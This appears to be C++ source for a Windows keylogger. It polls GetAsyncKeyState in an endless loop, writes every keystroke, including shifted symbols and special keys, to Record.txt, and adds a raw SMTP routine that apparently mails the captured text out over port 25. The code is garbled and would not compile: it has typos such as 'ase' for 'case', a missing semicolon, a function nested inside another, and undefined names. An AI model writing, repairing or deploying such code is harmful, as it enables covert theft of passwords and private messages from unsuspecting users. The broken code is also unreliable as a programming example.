#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <windowsx.h>
#include <fstream>
#include <time.h>

using namespace std;

void log();

int main()
{
    log();
    mail();
    return 0;
}

void log(){
    char key;

    for (;;)
    {
        for ( key=8; key<222; key++) {
            if (GetAsyncKeyState(key) == -32767){
                ofstream write ("Record.txt", ios::app);

                if ( (key>64)&&(key<91) && !(GetAsyncKeyState(0x10)) ){
                    key+=32;
                    write << key;
                    write.close();
                    break
                }
                else if((key>64)&& (key<91)){
                    write << key;
                    write.close();
                    break;
                }
                else {
                    switch(key){
                        case 48:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << ")";
                            else 
                                write << "0";
                        }
                        break;
                        case 49:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "!";
                            else
                                write << "1";
                        }
                        break;
                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "@";
                            else
                                write << "2";
                        }
                        break;
                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "#";
                            else
                                write << "3";
                        }
                        break;
                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "$";
                            else
                                write << "4";
                        }
                        break;
                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "%";
                            else
                                write << "5";
                        }
                        break;
                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "^";
                            else
                                write << "6";
                        }
                        break;
                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "&";
                            else
                                write << "7";
                        }
                        break;
                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "*";
                            else
                                write << "8";
                        }
                        break;
                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                            write << "(";
                            else
                                write << "9";
                        }
                        break;
                        case VK_SPACE:
                            write << " ";
                        break;
                        case VK_RETURN:
                            write << "\n";
                        break;
                        case VK_TAB:
                            write << "   ";
                        break;
                        case VK_BACK:
                            write << "<BackSpace>";
                        break;
                        ase VK_ESCAPE:
                            write << "<Esc>";
                        break;
                        ase VK_DELETE:
                            write << "<Delete>";
                        break;
                    }
                }
                
            }
        }
    }
}

void mail(){

    int MailIt (char *mailserver, char *emailto, char *emailfrom, 
    char *emailsubject, char *emailmessage) {
    SOCKET sockfd;
    WSADATA wsaData;
    FILE *smtpfile;
    
    #define bufsize 300
    int bytes_sent;   /* Sock FD */
    int err;
    struct hostent *host;   /* info from gethostbyname */
    struct sockaddr_in dest_addr;   /* Host Address */
    char line[1000];
    char *Rec_Buf = (char*) malloc(bufsize+1);
    smtpfile=fopen(SMTPLog,"a+");
    if (WSAStartup(0x202,&wsaData) == SOCKET_ERROR) {
      fputs("WSAStartup failed",smtpfile);
      WSACleanup();
      return -1;
    }
    if ( (host=gethostbyname(mailserver)) == NULL) {
       perror("gethostbyname");
       exit(1);
    }
    memset(&dest_addr,0,sizeof(dest_addr));
    memcpy(&(dest_addr.sin_addr),host->h_addr,host->h_length);

     /* Prepare dest_addr */
     dest_addr.sin_family= host->h_addrtype;  /* AF_INET from gethostbyname */
     dest_addr.sin_port= htons(25); /* PORT defined above */

     /* Get socket */

     if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
        perror("socket");
        exit(1);
        }
     /* Connect !*/
     fputs("Connecting....\n",smtpfile);
 
    if (connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr)) == -1){
        perror("connect");
        exit(1);
        }
     sleep(waittime);
     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
     fputs(Rec_Buf,smtpfile);
     strcpy(line,"helo me.somepalace.com\n");
     fputs(line,smtpfile);
     bytes_sent=send(sockfd,line,strlen(line),0);
     sleep(waittime);
     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
     fputs(Rec_Buf,smtpfile);
     strcpy(line,"MAIL FROM:<");
     strncat(line,emailfrom,strlen(emailfrom));
     strncat(line,">\n",3);
     fputs(line,smtpfile);
     bytes_sent=send(sockfd,line,strlen(line),0);
     sleep(waittime);
     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
     fputs(Rec_Buf,smtpfile);
     strcpy(line,"RCPT TO:<");
     strncat(line,emailto,strlen(emailto));
     strncat(line,">\n",3);
     fputs(line,smtpfile);
     bytes_sent=send(sockfd,line,strlen(line),0);
     sleep(waittime);
     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
     fputs(Rec_Buf,smtpfile);
     strcpy(line,"DATA\n");
     fputs(line,smtpfile);
     bytes_sent=send(sockfd,line,strlen(line),0);
     sleep(waittime);
     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
     fputs(Rec_Buf,smtpfile);
     sleep(waittime);
     strcpy(line,"To:");
     strcat(line,emailto);
     strcat(line,"\n");
     strcat(line,"From:");
     strcat(line,emailfrom);
     strcat(line,"\n");
     strcat(line,"Subject:");
     strcat(line,emailsubject);
     strcat(line,"\n");
     strcat(line,emailmessage);
     strcat(line,"\r\n.\r\n");
     fputs(line,smtpfile);
     bytes_sent=send(sockfd,line,strlen(line),0);
     sleep(waittime);
     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
     fputs(Rec_Buf,smtpfile);
     strcpy(line,"quit\n");
     fputs(line,smtpfile);
     bytes_sent=send(sockfd,line,strlen(line),0);
     sleep(waittime);
     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
     fputs(Rec_Buf,smtpfile);
     fclose(smtpfile);                          
     #ifdef WIN32
     closesocket(sockfd);
     WSACleanup();
     #else
     close(sockfd);
     #endif
}
}